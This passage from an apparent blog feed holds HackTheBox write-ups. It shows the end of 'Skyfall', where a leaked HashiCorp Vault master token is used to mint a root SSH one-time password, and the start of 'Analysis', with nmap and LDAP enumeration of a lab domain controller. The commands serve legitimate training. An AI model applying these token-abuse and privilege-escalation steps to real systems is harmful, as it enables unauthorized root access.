&lt;/span&gt;askyy@skyfall:~/muka&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; debug.log
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 askyy askyy 590 Feb  5 05:19 debug.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And now we can read the contents and find the master token inside this log!&lt;/p&gt;

&lt;h2 id=&quot;step-4---privilege-escalation&quot;&gt;&lt;a href=&quot;#step3-crafting-the-attack&quot;&gt;&lt;/a&gt;Step 4 - Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Now that we have the master token, we go back to our local machine and use assign this token to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VAULT_TOKEN&lt;/code&gt; variable.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;VAULT_TOKEN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;token&amp;gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vault status
Key             Value
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;             &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;
Seal Type       shamir
Initialized     &lt;span class=&quot;nb&quot;&gt;true
&lt;/span&gt;Sealed          &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;Total Shares    1
Threshold       1
Version         1.15.1
Build Date      2023-10-20T19:16:11Z
Storage Type    file
Cluster Name    vault-cluster-746fa9de
Cluster ID      6fc384e6-b108-1b05-2825-1de249607986
HA Enabled      &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this token we can create a OTP for the root user by running the following command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; vault write ssh/creds/admin_otp_key_role &lt;span class=&quot;nv&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.129.15.193 &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root
Key                Value
&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;
lease_id           ssh/creds/admin_otp_key_role/3zvgndWlUB1ZoeD0T19lmgTg
lease_duration     768h
lease_renewable    &lt;span class=&quot;nb&quot;&gt;false
&lt;/span&gt;ip                 10.129.15.193
key                24d68169-218f-f65c-7c22-0f4d7efef1c2
key_type           otp
port               22
username           root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we ssh as root:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall15.png&quot; alt=&quot;root shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Granting us the root shell!&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF, we learned a lot about MinIO’s storage and HashiCorp vault. We were able to bypass a 403 page at http://demo.skyfall.htb to discover a S3 bucket MinIO’s storage endpoint, which we communicated with it using MinIO Client. There, we found a backup file containing another endpoint, now corresponding to HashiCorp Vault, and a Vault Token. This token was used to create a OTP that could log us in as the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;askyy&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;After that, we escalated our privileges using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; and abusing file ownership to read the contents of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug.log&lt;/code&gt; file generated by the only command we could run as root. Inside the file, we found another vault token, but this one was a master token.&lt;/p&gt;

&lt;p&gt;Finally, with the master token, we were able to create a OTP for the root user, which gave us access to the root shell.&lt;/p&gt;

&lt;p&gt;Lot of action, indeed!&lt;/p&gt;

&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 04 Feb 2024 00:00:00 -0300</pubDate>
        <link>http://localhost:4000//skyfall-htb</link>
        <link href="http://localhost:4000/skyfall-htb"/>
        <guid isPermaLink="true">http://localhost:4000/skyfall-htb</guid>
      </item>
    
      <item>
        <title>Analysis - HackTheBox</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Let’s solve another machine from HackTheBox season 4: Analysis. This box is classified as Hard, so buckle up and prepare for battle!&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;For our approach mindset, we shall separate it as the following steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Reconnaissance&lt;/li&gt;
  &lt;li&gt;Getting foothold&lt;/li&gt;
  &lt;li&gt;System enumeration&lt;/li&gt;
  &lt;li&gt;Privilege escalation&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#step1-recon&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;

&lt;p&gt;Let’s start by enumerting the machine’s TCP open ports with Nmap:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ports.nmap &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 10.129.33.58
&lt;span class=&quot;c&quot;&gt;# Nmap 7.94 scan initiated Sun Jan 21 20:09:39 2024 as: nmap -p- -A -oN ports.nmap --min-rate 1000 -T4 10.129.33.58&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.33.58
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65507 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2024-01-21 23:13:31Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: analysis.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: analysis.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unauthorized&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message&lt;span class=&quot;s2&quot;&gt;&quot;
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message&quot;&lt;/span&gt;
|     HY000
|   oracle-tns: 
|     Invalid message-frame.&lt;span class=&quot;s2&quot;&gt;&quot;
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94%I=7%D=1/21%Time=65AD7A58%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(GetRequest,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\&lt;/span&gt;
SF:0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(HTTPOptions,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r
SF:(RTSPRequest,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(RPCCheck,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0&lt;/span&gt;
SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(DNSStatusRequestTCP,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
SF:1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY00
SF:0&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SSLSessionReq,2B,&quot;\x05\0
SF:\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0fInvalid&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2
SF:0message&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;05HY000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(TerminalServerCookie,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
SF:x1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(TLSSessionReq,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
SF:x08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(Kerberos,9,&quot;\
SF:x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,9,&quot;\x05\0\0\0\x0b\x08\x05\x1
SF:a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0fInvalid&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20message&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;05HY000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(FourOhFourRequest,9,
SF:&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(LPDString,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
SF:1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(LDAPSearchReq,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
SF:08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(LDAPBindReq,46
SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x88&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;Parse
SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20error&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20unserializing&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20protobuf&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20message&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;05HY000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(SIPOpt
SF:ions,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(LANDesk-RC,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
SF:08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(TerminalServer,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(Not
SF:esRPC,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;&apos;\x
SF:1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x
SF:05\x1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,
SF:32,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;16Inv
SF:alid&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20message-frame&lt;span class=&quot;se&quot;&gt;\.\&quot;\x&lt;/span&gt;05HY000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(ms-sql-s,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
SF:05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(afp,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01
SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(giop,9,&quot;\x05\0\0\0\x
SF:0b\x08\x05\x1a\0&quot;);
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/21%OT=53%CT=1%CU=38916%PV=Y%DS=2%DC=T%G=Y%TM=65AD7AA
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=103%GCD=2%ISR=107%TI=I%CI=RD%II=I%SS=S%TS=U)OPS(O1=M53CNW8NNS%O
OS:2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)WIN(W1=FF
OS:FF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5
OS:3CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q
OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD
OS:=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h02m30s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-01-21T23:14:40
|_  start_date: N/A

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   129.49 ms 10.10.14.1
2   129.54 ms 10.129.33.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 21 20:12:21 2024 -- 1 IP address (1 host up) scanned in 162.35 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see a bunch of services, but the ones that are interesting to me at a first glance are ports 53, 80, 88 and 389. If we attempt to access the website, we get a 404.&lt;/p&gt;

&lt;p&gt;Let’s shift our attention to other services for now. I’ve decided to run Nmap again the script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldap* and not brute&lt;/code&gt; to see if we can find the domain name and other useful information.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ldap* and not brute&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ldap-enum.txt 10.129.33.58
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
|       schemaNamingContext: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
|       namingContexts: &lt;span class=&quot;nv&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
|       namingContexts: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
|       namingContexts: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Schema,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Configuration,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;analysis,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
